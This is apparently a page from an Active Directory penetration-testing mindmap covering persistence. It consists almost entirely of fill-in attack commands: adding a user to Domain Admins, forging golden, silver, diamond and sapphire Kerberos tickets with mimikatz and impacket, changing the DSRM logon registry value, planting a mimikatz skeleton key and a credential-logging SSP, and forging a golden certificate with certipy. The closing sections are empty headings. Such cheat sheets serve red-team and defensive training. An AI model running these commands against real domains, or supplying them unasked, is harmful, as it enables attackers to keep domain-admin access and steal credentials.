---
title: "Persistence"
category: persistence
color: "#BC7634"
tags:
  - ad-mindmap
  - persistence
---

# ♾️ Persistence

> [!info] Mindmap box `Persistence`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## ADD DA

- `net group "domain admins" myuser /add /domain`

## Golden ticket

- `ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- `mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"` [↗](https://github.com/gentilkiwi/mimikatz)

## Silver Ticket

- `mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"` [↗](https://github.com/gentilkiwi/mimikatz)
- `ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

## Directory Service Restore Mode (DSRM)

- `PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`

## Skeleton Key

- `mimikatz "privilege::debug" "misc::skeleton" "exit" #password is mimikatz` [↗](https://github.com/gentilkiwi/mimikatz)

## Custom SSP

- `mimikatz "privilege::debug" "misc::memssp" "exit"` [↗](https://github.com/gentilkiwi/mimikatz)
    - C:\Windows\System32\kiwissp.log

## Golden certificate

- `certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>` [↗](https://github.com/ly4k/Certipy)
    - `certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>` [↗](https://github.com/ly4k/Certipy)

## Diamond ticket

- `ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

## Saphire Ticket

- `ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

## DC shadow

## ACL manipulation

## ...
